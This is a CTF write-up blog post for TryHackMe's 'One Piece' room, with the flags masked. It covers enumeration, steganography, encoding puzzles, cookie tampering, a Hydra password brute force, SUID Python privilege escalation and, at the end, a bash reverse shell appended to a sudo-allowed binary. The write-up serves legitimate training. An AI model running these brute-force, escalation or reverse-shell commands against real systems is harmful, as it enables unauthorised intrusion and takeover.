---
layout: default
title : bvr0n - One Piece Write-up
---

_**Oct 04, 2020**_

[One Piece](https://tryhackme.com/room/ctfonepiece65) Writeup


## Nmap Scan :

```
bvr0n@kali:~/CTF/THM/One_Piece$ nmap -sC -sV 10.10.199.195
PORT      STATE    SERVICE        VERSION
21/tcp    open     ftp            vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             187 Jul 26 07:27 welcome.txt
| 
22/tcp    open     ssh            OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 01:18:18:f9:b7:8a:c3:6c:7f:92:2d:93:90:55:a1:29 (RSA)
|   256 cc:02:18:a9:b5:2b:49:e4:5b:77:f9:6e:c2:db:c9:0d (ECDSA)
|_  256 b8:52:72:e6:2a:d5:7e:56:3d:16:7b:bc:51:8c:7b:2a (ED25519)
33/tcp    filtered dsp
80/tcp    open     http           Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: New World
407/tcp   filtered timbuktu
425/tcp   filtered icad-el
1094/tcp  filtered rootd
1145/tcp  filtered x9-icue
1148/tcp  filtered elfiq-repl
1287/tcp  filtered routematch
1700/tcp  filtered mps-raft
2381/tcp  filtered compaq-https
3006/tcp  filtered deslogind
3011/tcp  filtered trusted-web
3527/tcp  filtered beserver-msg-q
5087/tcp  filtered biotic
5555/tcp  filtered freeciv
6025/tcp  filtered x11
6901/tcp  filtered jetstream
7004/tcp  filtered afs3-kaserver
7627/tcp  filtered soap-http
8383/tcp  filtered m2mservices
9050/tcp  filtered tor-socks
32773/tcp filtered sometimes-rpc9
49153/tcp filtered unknown
```

## FTP :


login the ftp we get some files, always use the command "ls -la" :
```
ncftp / > ls -la
drwxr-xr-x    3 0        0            4096 Jul 26 07:41 .
drwxr-xr-x    3 0        0            4096 Jul 26 07:41 ..
drwxr-xr-x    2 0        0            4096 Jul 26 07:42 .the_whale_tree
-rw-r--r--    1 0        0             187 Jul 26 07:27 welcome.txt

ncftp /.the_whale_tree > ls -la
drwxr-xr-x    2 0        0            4096 Jul 26 07:42 .
drwxr-xr-x    3 0        0            4096 Jul 26 07:41 ..
-rw-r--r--    1 0        0            8652 Jul 26 07:42 .road_poneglyph.jpeg
-rw-r--r--    1 0        0            1147 Jul 26 07:42 .secret_room.txt
```
the file secret_room.txt have a coversation between 3 people, it have also the answer for the 1st question.

the image we got have a file inside, let's get it :
```
bvr0n@kali:~/CTF/THM/One_Piece$ steghide extract -sf road_poneglyph.jpeg 
Enter passphrase: (nopasswd)
wrote extracted data to "road_poneglyphe1.txt".
```
inside the file it's some encoding from base32 -> morse code. (rabbit hole)


## Web page :


when checking the source code we get a encoded text, it's base32 -> base64 -> base85 :
```
"Nami ensures there are precisely 3472 possible places where she could have lost it".
```
So if we check the hint of second question we get [Only Sea, It's Not Terrible] combining the capital letters we get [OSINT].


## OSINT :

After some enum and asking the author for a hint, our next destination is Github :pp

Our Log Pose is right here :
```
https://github.com/1FreyR/LogPose/blob/master/LogPose.txt
```

## Brute force :


In the question they said something about Apache, maybe we need to use this list against the website, let's try : (always check extensions ;))
```
bvr0n@kali:~/CTF/THM/One_Piece$ gobuster dir -u http://10.10.199.195/ -w LogPose.txt -x html,php,txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.199.195/
[+] Threads:        10
[+] Wordlist:       LogPose.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     html,php,txt
[+] Timeout:        10s
===============================================================
2020/10/02 17:42:30 Starting gobuster
===============================================================
/*********.**** (Status: 200)
```
Going to the path we found, we get the 2d question & an image under the name rabbit_hole.png :

the first digits gives a key :
```
6b 65 79 3a 69 6d 20 20 6f 6e 20 6f 74 69 20 6f 74 69 ==> key:im  on oti oti
```
the second one is base91 when decoded it gives :
```
ito ito no mi:yek
```
the third one it is obviously Vigenère, but Vigenère doesn't accept key's with space -_- / let's try without space :
```
Key = imonotioti ==> dvfgfhnnzo iz songq smankiil 
Key = itoitonomi ==> doflamingo is still standing
```
as the author said, this was a RABBIT HOLE -__-

after some more enum i found out that http://10.10.199.195/css/dressrosa_style.css had something inside :
```
background-image: url("../****_****_***.***");
```
downloading the image and inspecting the strings of it we see this :
```
bvr0n@kali:~/CTF/THM/One_Piece$ strings ****_****_***.*** | head
JFIF
Doflamingo is /**.***
```
downloading the image and inspecting the strings we get this : 
```
bvr0n@kali:~/CTF/THM/One_Piece$ strings **.*** | tail
ueh.
&tr:
+l!P
!zi+G
Congratulations, this is the Log Pose that should lead you to the next island: /*****_****.***
```

## Injection :


After going to the path we retieved we get prompted with a submit form, it's Burp Suite time, when we intercept the request we get this : 
```
GET /*****_****.*** HTTP/1.1
Host: 10.10.199.195
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: cookie=NoCakeForYou
Upgrade-Insecure-Requests: 1
```
change the cookie value to : CakeForYou & forward it to get this :
```
You successfully stole a copy of the 2nd Road Poneglyph: <br/>
        You succeed to run away but you don't own a Log Pose to go to Kaido's Island, you are sailing without even knowing where you are heading to.<br/>
        You end up reaching a strange island: /******.**** 
```
Going to this path we get the 4rd question's answer, the coded text was a Rabbit Hole again -_-.

inspecting the code source here : view-source:http://10.10.199.195//buggy_games/brain_teaser.js , i found something weird : 
```
"Log Pose: /**********.***"  
```
Going to this path we get the answer of the 5th question.

Something spote my eyes at the beginning and i saw it again in the code source of /0n1g********.php , there is kaido.jpeg when all of the previous images were png, plus there is a hint in the webpage that says "Speaking about brute force, Kaido is unbeatable", let's download it and brute force it :
```
bvr0n@kali:~/CTF/THM/One_Piece$ stegcracker kaido.jpeg ~/Documents/rockyou.txt 
StegCracker 2.0.9 - (https://github.com/Paradoxis/StegCracker)
Copyright (c) 2020 - Luke Paris (Paradoxis)

Counting lines in wordlist..
Attacking file 'kaido.jpeg' with wordlist '/home/bvr0n/Documents/rockyou.txt'..
Successfully cracked file with password: ********
Tried 106372 passwords
Your file has been written to: kaido.jpeg.out
```
Since we got the Username, Let's brute force the password with Hydra : 
```
bvr0n@kali:~/CTF/THM/One_Piece$ hydra -l ****_**_***_****** -P ~/Documents/rockyou.txt 10.10.135.18 http-post-form "/**********.***:user=^USER^&password=^PASS^&submit_creds=Login:ERROR"
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-10-04 12:01:51
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://10.10.135.18:80/**********.***:user=^USER^&password=^PASS^&submit_creds=Login:ERROR
[STATUS] 1108.00 tries/min, 7756 tries in 00:07h, 14336643 to do in 215:40h, 16 active
[STATUS] 1130.47 tries/min, 16957 tries in 00:15h, 14327442 to do in 211:14h, 16 active
[80][http-post-form] host: 10.10.135.18   login: ****_**_***_******   password: ********
1 of 1 target successfully completed, 1 valid password found
```
When login we have a text that says :
```
You successfully stole a copy of the 3rd Road Poneglyph: <br/>
       You succeed to run away and there is only one Road Poneglyph left to find to be able to reach Laugh Tale.
        Unfortunately, the location of this last Poneglyph is "..."
```

After spending some time to get the location of the last Poneglyph, it was in front of my eyes xD :

Unfortunately, the location of this last Poneglyph is ........... ## the "..." is the path.

The location is /........... , goning to it give us a coded text :
```
The last Road Poneglyphe: 
```

After combining all of the Road Poneglyph together we get a pattern of encoding which is as follow :
```
base32 -> morse -> binary -> hex -> base58 -> base64

******_*_*****:*_****_**_***_***@**_****!
```

## Internal Enum :


After running some tools inside and got nothing, i came across something beautiful when runnig this command haha : 
```
******_*_*****@Laugh-Tale:~$ find / -type f -perm -4000 2>/dev/null
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/gomugomunooo_king_kobraaa
/usr/bin/chfn
/usr/bin/arping
/usr/sbin/pppd
/usr/lib/snapd/snap-confine
/usr/lib/xorg/Xorg.wrap
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
```
Yes that file isn't normal, after inspecting it with strace i found out that it's behaving like python O.o
```
******_*_*****@Laugh-Tale:~$ /usr/bin/gomugomunooo_king_kobraaa
Python 3.6.9 (default, Jul 17 2020, 12:50:27) 
[GCC 8.4.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> 

******_*_*****@Laugh-Tale:~$ /usr/bin/gomugomunooo_king_kobraaa -c 'import os; os.execl("/bin/bash", "sh", "-p")'
sh-4.4$ id
uid=1001(******_*_*****) gid=1001(luffy) euid=1000(7uffy_vs_T3@ch) groups=1001(luffy)
```
We can now read the files inside /teach
```
sh-4.4$ cat .password.txt 
7uffy_vs_T3@ch:***_****_**_***_*****
```
I spote something inside the 2nd user which is :
```
7uffy_vs_T3@ch@Laugh-Tale:/home$ sudo -l
[sudo] password for 7uffy_vs_T3@ch: 
Matching Defaults entries for 7uffy_vs_T3@ch on Laugh-Tale:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User 7uffy_vs_T3@ch may run the following commands on Laugh-Tale:
    (ALL) /usr/local/bin/less
```
Normaly with these permission on less , we can read everything, but in this case no :
```
7uffy_vs_T3@ch@Laugh-Tale:~$ sudo less /etc/profile 
Sorry, I can't tell you where is the One Piece
```
After some time i tried something simple, i ran this command :
```
7uffy_vs_T3@ch@Laugh-Tale:~$ sudo less /usr/local/bin/less
Sorry, I can't tell you where is the One Piece
```
i had to make a guess that this less is executing something, i tried a revershell and it worked :
```
7uffy_vs_T3@ch@Laugh-Tale:~$ echo 'bash -i >& /dev/tcp/your_ip/8080 0>&1' >> /usr/local/bin/less
7uffy_vs_T3@ch@Laugh-Tale:~$ sudo /usr/local/bin/less

root@Laugh-Tale:~# id
uid=0(root) gid=0(root) groups=0(root)
```
And done we manage to get root with a simple revershell ;) 

The final file i got it through this command : 
```
root@Laugh-Tale:~# find / -user root -type f -name "*.txt"
```
In a Mysterious way, i finally found it ;)


<br>
best regards

[bvr0n](https://github.com/bvr0n)
